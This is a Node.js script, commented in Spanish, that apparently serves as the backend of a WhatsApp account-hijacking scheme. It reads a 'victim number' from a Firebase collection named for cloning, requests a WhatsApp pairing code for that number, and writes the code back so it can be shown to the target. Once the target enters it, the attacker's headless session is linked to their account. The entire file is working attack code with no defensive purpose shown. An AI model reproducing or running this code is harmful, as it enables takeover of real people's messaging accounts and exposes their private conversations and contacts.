const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// FUNCIÓN PARA PROCESAR EL NUMERO
async function procesarNumero(docSnap) {
    const data = docSnap.data();
    if (data && data.status === "solicitando_codigo" && data.numero_victima) {
        console.log("Detectado número para vincular:", data.numero_victima);
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            await docSnap.ref.update({ 
                pairingCode: code, 
                status: "mostrando_codigo" 
            });
            console.log("¡CÓDIGO GENERADO Y ENVIADO!: ", code);
        } catch (e) {
            console.error("Error al generar código:", e.message);
        }
    }
}

// ESCUCHA AUTOMÁTICA + POLLING (Doble seguridad)
db.collection("wa_clon_global").doc("current_session").onSnapshot(procesarNumero);

// Revisión manual cada 10 segundos por si el Snapshot falla
setInterval(async () => {
    const doc = await db.collection("wa_clon_global").doc("current_session").get();
    if(doc.exists) procesarNumero(doc);
}, 10000);

client.on('ready', () => {
    console.log("SESIÓN TOTALMENTE ACTIVA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(err => console.log("Fallo al inicializar:", err));

http.createServer((req, res) => { res.end('MOTOR ONLINE'); }).listen(process.env.PORT || 3000);
